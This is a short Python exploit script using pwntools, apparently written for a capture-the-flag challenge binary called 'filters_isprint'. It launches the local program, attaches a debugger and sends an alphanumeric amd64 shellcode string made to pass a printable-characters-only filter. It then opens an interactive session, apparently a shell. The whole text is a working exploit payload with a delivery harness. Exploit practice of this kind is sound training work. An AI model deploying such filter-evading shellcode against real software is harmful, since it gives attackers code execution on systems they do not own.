from pwn import *
context.arch = 'amd64'

p = process("./filters_isprint")

shellcode = b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
print(shellcode)

gdb.attach(p)
p.send(shellcode)
p.interactive()